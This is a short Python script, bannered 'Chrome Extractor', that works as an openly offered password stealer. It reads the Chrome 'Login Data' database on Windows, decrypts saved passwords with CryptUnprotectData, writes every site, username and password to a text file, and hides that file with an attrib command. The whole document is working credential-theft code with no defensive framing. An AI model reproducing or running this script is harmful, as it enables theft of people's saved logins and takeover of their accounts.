from os import getenv, system
import sqlite3
import win32crypt

print(
    " / ___/ /  _______  __ _  ___    \n"+        
    "/ /__/ _ \/ __/ _ \/  ' \/ -_)      \n"+     
    "\___/_//_/_/__\___/_/_/_/\__/__ \n"       +  
    "  / __/_ __/ /________ _____/ /____  ____\n"+
    " / _/ \ \ / __/ __/ _ `/ __/ __/ _ \/ __/\n"+
    "/___//_\_\\__/_/  \_,_/\__/\__/\___/_/ \n")

db_path = getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

try:
    conn = sqlite3.connect(db_path, 1)
    print("[+] Connected to Database ..")

    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    final_data = cursor.fetchall()

    print("[>] Found " + str(len(final_data)) + " passwords ..\n")
    pwd_txt = open("chrome.txt","w")
    pwd_txt.write("Extracted Saved Chrome Passwords :\n")

    for row in final_data:
        try:
            password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf8')
            if password:
                if str(row[0]):
                    pwd_txt.write("\tWebsite  : " + str(row[0]))
                else:
                    pwd_txt.write("\tWebsite  : Unknown")
                    
                pwd_txt.write("\t\tUsername  : " + str(row[1]))
                pwd_txt.write("\t\t\tPassword  " + str(password))
                pwd_txt.write("\n")
        
        except Exception:
            pass

    system( "attrib +h chrome.txt" )
    print("[>] Check chrome.txt ..")

except sqlite3.OperationalError:
  print("[x] DataBase is locked -_-")
